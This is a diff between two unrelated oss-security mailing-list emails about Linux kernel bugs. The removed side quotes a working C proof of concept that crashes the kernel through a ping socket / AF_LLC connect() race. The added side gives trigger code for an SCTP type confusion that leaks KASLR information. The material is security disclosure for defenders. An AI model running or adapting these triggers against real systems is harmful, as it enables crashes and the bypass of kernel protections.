@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2819" "Friday" "24" "March" "2017" "21:43:30" "+0100" "Andrey Konovalov" "andreyknvl@google.com" "<CAAeHK+yrE7+BZztHVn-2jKgLqgzgbBEa4VWCO8SL45oD0nRxEw@mail.gmail.com>" "79" "Re: [oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race" nil nil nil "3" "2017032420:43:30" "[oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race" (number mark "U       andreyknvl@g Mar 24   79/2819  " thread-indent "\"Re: [oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race\"\n") "<20170324202714.GA29241@openwall.com>" ("<20170324202714.GA29241@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 16126 invoked by uid 550); 24 Mar 2017 20:45:30 -0000
+Received: (qmail 10120 invoked by uid 550); 23 Jan 2023 18:55:35 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,124 +7,71 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 15603 invoked from network); 24 Mar 2017 20:43:43 -0000
+Received: (qmail 32049 invoked from network); 23 Jan 2023 18:40:03 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20161025;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
-         :cc;
-        bh=ThrulrF7dd7GrukasUGBQX0jAS2gDIWR7c/5c9yp1og=;
-        b=EAWd2IlmicbcpuGMjGMrmbBNP3yDPE6ao4D4fNYt5BATyqPT2bNoA6HstZTBE5B3PG
-         fD0Hb0KPZROf/RrcAfJry6x5J1R2MHC+uuVihDI3u8LAKVvKPCI9t0yn+aBzeNTtbYYe
-         JFgBwp2Ea/dP5Hwl7ztsJlBf1lyqQ++s9rJenhyjZQ7w3o8J52EXT7y5Z5WtvYMhGqGQ
-         V5B+vulrN7+GZf98HnwP/2j2Rj4hkPGIjA5I8x5hDHxKaO4S+HoPEX784TNl1hf8C0BT
-         teeppuDpW654cknQliDinaOoSq4Jdv/O+esuNlnakoLzLIdXjH06V5FhO54x1S7le49m
-         Fydw==
+        d=diag.uniroma1.it; s=google;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=+5RWk8K7fHaT2+snWaaGbUJa7lk8Ud965H9fZIxf69E=;
+        b=FhGkxFTIuzprRfippNhF4QxKvfqwnnwr9zjrXDy1M3z5xRi/tIkJoowkPmvPKmkAP3
+         SXSpqu9FKoV94ZfaoEkZ3BmCOVN41VXk8VqmenrmOT+3U/Xldr0qio3KWv/4/313a/T3
+         4sk6K4GHsgxHcrqTcc58umDn/iLq1VJzXBtqM=
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to:cc;
-        bh=ThrulrF7dd7GrukasUGBQX0jAS2gDIWR7c/5c9yp1og=;
-        b=WoR0T2n+/Y9c5qaP0JN5eWcYbze4rscTUcYa8UrasqMvH0qU/RnBqY77vEOp8e8O/o
-         qU+gO7pkZ2OIFluSc3tKm3ZTizY1nEt1s9Go0RH+HL1WtekZiYGy84R0kqWViFPyHb+9
-         t+nH2ij7nAFKqGBWAzZYIwNLPtry9ZOcRJZKV/a8rg7idQZESPegvefwdfpIn58dYvyO
-         1nCBEdmWvrlT9ZJQb1j6+P0/skK3Ql2dikRZBWK1rkxtqTlLDFVr4fU2aLwuoXUdncDM
-         KSWoXTnPas1FZYs+nEk5d38npe41WQBN2UY0Sc7sY+TfjFB5HQz6hwIEKp75a7lWxvb5
-         eWDQ==
-X-Gm-Message-State: AFeK/H1vnHRmgG2EUmCnbLivLsxCSj/X2pbXoAAmqXZVy04WbWCVe+wgkb33c9X0DiOyJSl2sXJtbdgmJTpis/ue
-X-Received: by 10.99.38.2 with SMTP id m2mr11146974pgm.169.1490388210536; Fri,
- 24 Mar 2017 13:43:30 -0700 (PDT)
+        d=1e100.net; s=20210112;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=+5RWk8K7fHaT2+snWaaGbUJa7lk8Ud965H9fZIxf69E=;
+        b=6ldtePW3P4LmWpg5xVaOk0GNdFg730CvC2bfu31ECbLcbfZgJ6ckxopTNoyYiwtyG2
+         +ZQoKwJvXdjpbDotbzJYOUcRH/SFLOfN0CSW+foYvfhAxV0gDRHnien11qHQ0Z5RD8Eo
+         ibNQDxOi50+rhcmO7/fjiPBG2hxHOSOwg/D5TN2yy5X3sHrUQq6CmcEVXLBtvnZVTUSB
+         ffRI2ZlSRoL/HGo3imMg9FF+/8YKBzdv6FMcLkI2YEfwQN3AHYH1aPExo635/1XdlyHq
+         XBCXM5MVGO5iyh/XmcpRj436VLNwY1egeheegxSNgn3Hqg7GRSFCCNTlT70tpYoB13TU
+         8JKw==
+X-Gm-Message-State: AFqh2kpof8jZVSzUnPcbtO5afr2jIpu+gY1td1ENCsEpgA9C8TipDIAm
+	I52U/I4Z0kWHycwQ2ik8KDqI0fzrKD01OpEXFfzQtg+Kxp7yGTK+
+X-Google-Smtp-Source: AMrXdXv51QqLHl8xX1p21+eYEpUoVOqnzQLSntnCBCGY1iYORz1eGcA/o9f7mqjz63Hbd3NpsABpCkhflSAAq/TJvDA=
+X-Received: by 2002:a05:6402:608:b0:499:c290:b7e1 with SMTP id
+ n8-20020a056402060800b00499c290b7e1mr2670247edv.168.1674499191681; Mon, 23
+ Jan 2023 10:39:51 -0800 (PST)
 MIME-Version: 1.0
-In-Reply-To: <20170324202714.GA29241@openwall.com>
-References: <20170324202714.GA29241@openwall.com>
-From: Andrey Konovalov <andreyknvl@google.com>
-Date: Fri, 24 Mar 2017 21:43:30 +0100
-Message-ID: <CAAeHK+yrE7+BZztHVn-2jKgLqgzgbBEa4VWCO8SL45oD0nRxEw@mail.gmail.com>
-To: oss-security@lists.openwall.com, "David S. Miller" <davem@davemloft.net>, 
-	Alexey Kuznetsov <kuznet@ms2.inr.ac.ru>, James Morris <jmorris@namei.org>, 
-	Hideaki YOSHIFUJI <yoshfuji@linux-ipv6.org>, Patrick McHardy <kaber@trash.net>, 
-	netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>, 
-	Eric Dumazet <edumazet@google.com>
-Cc: Vasily Kulikov <segoon@openwall.com>
-Content-Type: text/plain; charset=UTF-8
-Subject: Re: [oss-security] Linux kernel ping socket / AF_LLC connect()
- sin_family race
+From: Pietro Borrello <borrello@diag.uniroma1.it>
+Date: Mon, 23 Jan 2023 19:39:41 +0100
+Message-ID: <CAEih1qVJxs7j7XAjjjpmK_xFit+sekDuHCOzsaExmMh6ZjG48Q@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] Linux Kernel: sctp: KASLR leak in inet_diag_msg_sctpasoc_fill()
 
-On Fri, Mar 24, 2017 at 9:27 PM, Solar Designer <solar@openwall.com> wrote:
-> Hi,
->
-> I haven't fully investigated this issue, and the Subject is provisional
-> (but will probably get stuck).  I am not yet sure which kernel
-> subsystem(s) to blame here (ping sockets? LLC sockets? other/more?), and
-> there might be other ways to trigger the issue.
+Hi all,
 
-Reproduced the crash on current upstream
-(ebe64824e9de4b3ab3bd3928312b4b2bc57b4b7e).
+We reported a type confusion in inet_diag_msg_sctpasoc_fill() in
+net/sctp/diag.c, which uses a type confused pointer to return
+information to userspace when issuing a list_entry() on
+asoc->base.bind_addr.address_list.next when the list is empty.
 
-Adding kernel maintainers.
+The list, in theory, should never be empty, but it can be when binding
+an SCTP socket with something like:
+```
+servaddr.sin6_family = AF_INET6;
+servaddr.sin6_port = htons(0);
+servaddr.sin6_scope_id = 0;
+inet_pton(AF_INET6, "::1", &servaddr.sin6_addr);
+```
 
->
-> Just off Twitter:
->
-> https://twitter.com/danieljiang0415/status/845116665184497664
->
-> daniel_jiang
-> @danieljiang0415
-> google won't fix kernel crash bug, I release the poc now.
-> https://github.com/danieljiang0415/android_kernel_crash_poc
->
-> And the PoC is:
->
-> ---
-> #include <stdio.h>
-> #include <sys/socket.h>
-> #include <arpa/inet.h>
-> #include <stdlib.h>
-> static int sockfd = 0;
-> static struct sockaddr_in addr = {0};
->
-> void fuzz(void * param){
->     while(1){
->         addr.sin_family = 0;//rand()%42;
->         printf("sin_family1 = %08lx\n", addr.sin_family);
->         connect(sockfd, (struct sockaddr *)&addr, 16);
->     }
-> }
-> int main(int argc, char **argv)
-> {
->     sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
->     int thrd;
->     pthread_create(&thrd, NULL, fuzz, NULL);
->     while(1){
->         addr.sin_family = 0x1a;//rand()%42;
->         addr.sin_port = 0;
->         addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
->         connect(sockfd, (struct sockaddr *)&addr, 16);
->         addr.sin_family = 0;
->     }
->     return 0;
-> }
-> ---
->
-> I suppose the focus on Android is because it makes ping sockets
-> available to users by default, but the bug isn't Android-specific.
->
-> By granting ping sockets to a user, I am able to crash a RHEL7'ish
-> system with the above PoC quickly.  The crash (at least in my two tests)
-> is a NULL pointer dereference in net/ipv4/ping.c: ping_v4_unhash().
-> In newer upstream code, e.g. Linux 4.10.5, the function is renamed to
-> ping_unhash() since it's shared with IPv6, but is otherwise similar.
->
-> The two address families used by the PoC above are AF_UNSPEC and AF_LLC.
-> For the latter, net/llc/af_llc.c: llc_ui_connect() checks for AF_LLC and
-> then proceeds to overwrite parts of the "struct sockaddr".
-> llc_ui_bind() looks similar, so the issue might also be triggerable via
-> bind().  These overwrites might be directly related to the crash, or it
-> might be something further.  At first glance, these two functions look
-> similar in RHEL7 and 4.10.5, so, if relevant, can probably be used to
-> trigger the issue on latest upstream as well.
->
-> At this point, I think I'll leave further investigation to someone more
-> up-to-date on these interfaces and conventions.  I am merely conveying
-> the message, which at this point I understand only partially.
->
-> Alexander
+And then request a connection to:
+```
+connaddr.sin6_family = AF_INET6;
+connaddr.sin6_port = htons(20000);
+connaddr.sin6_scope_id = if_nametoindex("lo");
+inet_pton(AF_INET6, "fe88::1", &connaddr.sin6_addr);
+```
+
+The impact of the type confusion is a KASLR leak since the `laddr.v6.sin6_addr`
+is returned from the type confused pointer, which overlaps with `struct
+sctp_endpoint *ep` of the `struct sctp_association`.
+
+The fix from the maintainer prevents the connection to the socket with
+unmatched scopes and will be merged soon:
+https://lore.kernel.org/linux-sctp/9fcd182f1099f86c6661f3717f63712ddd1c676c.1674496737.git.marcelo.leitner%40gmail.com/T/
+
+Best regards,
+Pietro Borrello
